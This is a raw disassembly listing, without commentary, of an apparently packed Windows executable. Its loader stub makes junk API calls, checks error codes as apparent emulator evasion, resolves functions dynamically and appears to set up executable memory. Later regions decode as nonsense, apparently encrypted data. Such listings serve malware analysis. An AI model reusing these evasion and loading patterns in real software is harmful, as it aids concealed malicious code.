0x01001000:	pushl	%ebp	; from: 0x0100278d(MAY)
0x01001001:	movl	%esp, %ebp
0x01001003:	subl	$0x70, %esp
0x01001006:	pushl	%ebx
0x01001007:	movl	$0x0, -72(%ebp)
0x0100100e:	movl	$0x0, -24(%ebp)
0x01001015:	movl	$0x0, -112(%ebp)
0x0100101c:	movl	$0x0, -96(%ebp)
0x01001023:	movl	$0x0, -8(%ebp)
0x0100102a:	movl	$0x0, -108(%ebp)
0x01001031:	movl	$0x0, -104(%ebp)
0x01001038:	movl	$0x0, -20(%ebp)
0x0100103f:	movl	$0x0, -76(%ebp)
0x01001046:	movl	$0x0, -16(%ebp)
0x0100104d:	movl	$0x0, -88(%ebp)
0x01001054:	movl	$0x0, -4(%ebp)
0x0100105b:	movl	$0x0, -92(%ebp)
0x01001062:	movl	$0x0, -48(%ebp)
0x01001069:	movl	$0x0, -84(%ebp)
0x01001070:	movl	$0x0, -44(%ebp)
0x01001077:	movl	$0x0, -80(%ebp)
0x0100107e:	movl	$0x0, -12(%ebp)
0x01001085:	movl	0x0104c120, %eax
0x0100108a:	movl	%eax, -40(%ebp)
0x0100108d:	movl	0x0104c124, %ecx
0x01001093:	movl	%ecx, -36(%ebp)
0x01001096:	movl	0x0104c128, %edx
0x0100109c:	movl	%edx, -32(%ebp)
0x0100109f:	movb	0x0104c12c, %al
0x010010a4:	movb	%al, -28(%ebp)
0x010010a7:	movl	0x0104c130, %ecx
0x010010ad:	movl	%ecx, -64(%ebp)
0x010010b0:	movl	0x0104c134, %edx
0x010010b6:	movl	%edx, -60(%ebp)
0x010010b9:	movl	0x0104c138, %eax
0x010010be:	movl	%eax, -56(%ebp)
0x010010c1:	movw	0x0104c13c, %cx
0x010010c8:	movw	%cx, -52(%ebp)
0x010010cc:	movb	0x0104c13e, %dl
0x010010d2:	movb	%dl, -50(%ebp)
0x010010d5:	movl	$0x40, -48(%ebp)
0x010010dc:	leal	-64(%ebp), %eax
0x010010df:	pushl	%eax
0x010010e0:	leal	-16(%ebp), %ecx
0x010010e3:	pushl	%ecx
0x010010e4:	call	ConvertSidToStringSidA@advapi32.dll	; targets: 0xff000080(MAY)
0x010010ea:	testl	%eax, %eax
0x010010ec:	je	0x01001117	; targets: 0x010010ee(MAY), 0x01001117(MAY)
0x010010ee:	pushl	$0x1	; from: 0x010010ec(MAY)
0x010010f0:	leal	-16(%ebp), %edx
0x010010f3:	pushl	%edx
0x010010f4:	call	DeleteAce@advapi32.dll	; targets: 0xff000020(MAY)
0x010010fa:	leal	-48(%ebp), %eax
0x010010fd:	pushl	%eax
0x010010fe:	leal	-16(%ebp), %ecx
0x01001101:	pushl	%ecx
0x01001102:	pushl	$0x3
0x01001104:	call	CopySid@advapi32.dll	; targets: 0xff000050(MAY)
0x0100110a:	testl	%eax, %eax
0x0100110c:	je	0x01001117	; targets: 0x0100110e(MAY), 0x01001117(MAY)
0x0100110e:	movl	-16(%ebp), %edx	; from: 0x0100110c(MAY)
0x01001111:	addl	$0x1, %edx
0x01001114:	movl	%edx, -16(%ebp)
0x01001117:	call	GetLastError@kernel32.dll	; targets: 0xff0000a0(MAY)	; from: 0x010010ec(MAY), 0x0100110c(MAY)
0x0100111d:	movl	%eax, -44(%ebp)
0x01001120:	movzwl	-44(%ebp), %eax
0x01001124:	cmpl	$0x539, %eax
0x01001129:	jne	0x0100115a	; targets: 0x0100112b(MAY), 0x0100115a(MAY)
0x0100112b:	movl	$0xe0d, -20(%ebp)	; from: 0x01001129(MAY)
0x01001132:	leal	-40(%ebp), %ecx
0x01001135:	pushl	%ecx
0x01001136:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000030(MAY)
0x0100113c:	movl	%eax, -96(%ebp)
0x0100113f:	movl	$0x3a, -84(%ebp)
0x01001146:	movb	$0x0, -52(%ebp)
0x0100114a:	movl	$0x443220fb, -8(%ebp)
0x01001151:	movl	$0xf6527, -104(%ebp)
0x01001158:	jmp	0x01001168	; targets: 0x01001168(MAY)
0x0100115a:	movb	$0x0, 0x0101b700	; from: 0x01001129(MAY)
0x01001161:	movb	$0x0, 0x01005770
0x01001168:	pushl	$0x0	; from: 0x01001158(MAY)
0x0100116a:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000030(MAY)
0x01001170:	movl	%eax, -44(%ebp)
0x01001173:	pushl	GetModuleHandleA@kernel32.dll
0x01001179:	popl	%edx
0x0100117a:	movl	%edx, -108(%ebp)
0x0100117d:	leal	-64(%ebp), %edx
0x01001180:	pushl	%edx
0x01001181:	movl	-96(%ebp), %eax
0x01001184:	pushl	%eax
0x01001185:	call	GetProcAddress@kernel32.dll	; targets: 0xff000060(MAY)
0x0100118b:	movl	%eax, -68(%ebp)
0x0100118e:	pushl	-48(%ebp)
0x01001191:	pushl	$0x1000
0x01001196:	movl	-20(%ebp), %eax
0x01001199:	addl	$0x46, %eax
0x0100119c:	pushl	%eax
0x0100119d:	pushl	$0x0
0x0100119f:	movl	-68(%ebp), %ebx
0x010011a2:	call	%ebx	; targets: unresolved

start:
0x01001240:	pushl	%ebp
0x01001241:	movl	%esp, %ebp
0x01001243:	subl	$0x54, %esp
0x01001246:	movl	$0x0, -52(%ebp)
0x0100124d:	movl	$0x0, -4(%ebp)
0x01001254:	movl	$0x0, -80(%ebp)
0x0100125b:	movl	$0x0, -76(%ebp)
0x01001262:	movl	$0x0, -48(%ebp)
0x01001269:	leal	-56(%ebp), %eax
0x0100126c:	pushl	%eax
0x0100126d:	pushl	$0x8
0x0100126f:	call	GetTempPathA@kernel32.dll	; targets: 0xff000090(MAY)
0x01001275:	leal	-72(%ebp), %ecx
0x01001278:	pushl	%ecx
0x01001279:	call	GetLocalTime@kernel32.dll	; targets: 0xff000040(MAY)
0x0100127f:	call	GetLastError@kernel32.dll	; targets: 0xff0000a0(MAY)
0x01001285:	movl	%eax, -48(%ebp)
0x01001288:	pushl	$0x8
0x0100128a:	leal	-44(%ebp), %edx
0x0100128d:	pushl	%edx
0x0100128e:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000070(MAY)
0x01001294:	movl	-52(%ebp), %eax
0x01001297:	pushl	%eax
0x01001298:	call	0x010012d0	; targets: 0x010012d0(MAY)
0x0100129d:	addl	$0x4, %esp	; from: 0x0100279b(MAY)
0x010012a0:	call	0x010027a0	; targets: 0x010027a0(MAY)
0x010012a5:	movl	$0x0, -84(%ebp)	; from: 0x010027ae(MAY)
0x010012ac:	jmp	0x010012b7	; targets: 0x010012b7(MAY)
0x010012ae:	movl	-84(%ebp), %ecx	; from: 0x010012bd(MAY)
0x010012b1:	addl	$0x1, %ecx
0x010012b4:	movl	%ecx, -84(%ebp)
0x010012b7:	cmpl	$0x64, -84(%ebp)	; from: 0x010012ac(MAY)
0x010012bb:	jae	0x010012bf	; targets: 0x010012bd(MAY)
0x010012bd:	jmp	0x010012ae	; targets: 0x010012ae(MAY)	; from: 0x010012bb(MAY)
0x010012d0:	pushl	%ebp	; from: 0x01001298(MAY)
0x010012d1:	movl	%esp, %ebp
0x010012d3:	subl	$0x40, %esp
0x010012d6:	pushl	%esi
0x010012d7:	movl	$0x0, -64(%ebp)
0x010012de:	movl	$0x0, -60(%ebp)
0x010012e5:	movl	$0x0, -52(%ebp)
0x010012ec:	movl	$0x0, -40(%ebp)
0x010012f3:	movl	$0x0, -32(%ebp)
0x010012fa:	movl	$0x0, -44(%ebp)
0x01001301:	movl	$0x104c140, -48(%ebp)
0x01001308:	movl	$0x29d0a075, -40(%ebp)
0x0100130f:	movl	$0x0, -56(%ebp)
0x01001316:	movl	-40(%ebp), %eax
0x01001319:	movl	%eax, -36(%ebp)
0x0100131c:	movl	$0x0, -4(%ebp)
0x01001323:	movl	GetLastError@kernel32.dll, %ecx
0x01001329:	movl	%ecx, -4(%ebp)
0x0100132c:	pushl	$0x0
0x0100132e:	pushl	$0x4e
0x01001330:	pushl	$0x1e
0x01001332:	pushl	$0x0
0x01001334:	pushl	$0xffffffff
0x01001336:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff000010(MAY)
0x0100133c:	testl	%eax, %eax
0x0100133e:	je	0x0100277b	; targets: 0x0100277b(MAY), 0x01001344(MAY)
0x01001344:	inl	%dx, %eax	; from: 0x0100133e(MAY)
0x01001345:	movb	%al, 0xffffffffd74d8470
0x0100134a:	aad	$0xffffffca
0x0100134c:	orl	$0xb4dcc1c0, %eax
0x01001351:	insl	%dx, %es:(%edi)
0x01001352:	loope	0x010013bf	; targets: 0x01001354(MAY), 0x010013bf(MAY)
0x010013ba:	stc		; from: 0x010013d1(MAY)
0x010013bb:	movb	$0xfffffff9, %dl
0x010013bd:	imull	$0x2fe34d8c, -1294974078(%ecx), %edi
0x010013bf:	addb	$0xffffffb2, -48(%ebx)	; from: 0x01001352(MAY)
0x010013c3:	movw	%cs, -29(%ebp)
0x010013c6:	das	
0x010013c7:	decl	%esi
0x010013c8:	testb	$0xfffffffc, %al
0x010013ca:	ljmp	0x4039:0xfffffffff152afe9	; targets: 0x010013d1(MAY)
0x010013d1:	jae	0x010013ba	; targets: 0x010013ba(MAY)	; from: 0x010013ca(MAY)
0x0100277b:	movl	-4(%ebp), %esi	; from: 0x0100133e(MAY)
0x0100277e:	call	%esi	; targets: 0xff0000a0(MAY)
0x01002780:	movl	%eax, -60(%ebp)
0x01002783:	cmpl	$0x57, -60(%ebp)
0x01002787:	jne	0x01002795	; targets: 0x01002795(MAY), 0x01002789(MAY)
0x01002789:	movl	-36(%ebp), %edx	; from: 0x01002787(MAY)
0x0100278c:	pushl	%edx
0x0100278d:	call	0x01001000	; targets: 0x01001000(MAY)
0x01002795:	xorl	%eax, %eax	; from: 0x01002787(MAY)
0x01002797:	popl	%esi
0x01002798:	movl	%ebp, %esp
0x0100279a:	popl	%ebp
0x0100279b:	ret	; targets: 0x0100129d(MAY)

0x010027a0:	pushl	%ebp	; from: 0x010012a0(MAY)
0x010027a1:	movl	%esp, %ebp
0x010027a3:	subl	$0x124, %esp
0x010027a9:	xorl	%eax, %eax
0x010027ab:	movl	%ebp, %esp
0x010027ad:	popl	%ebp
0x010027ae:	ret	; targets: 0x010012a5(MAY)

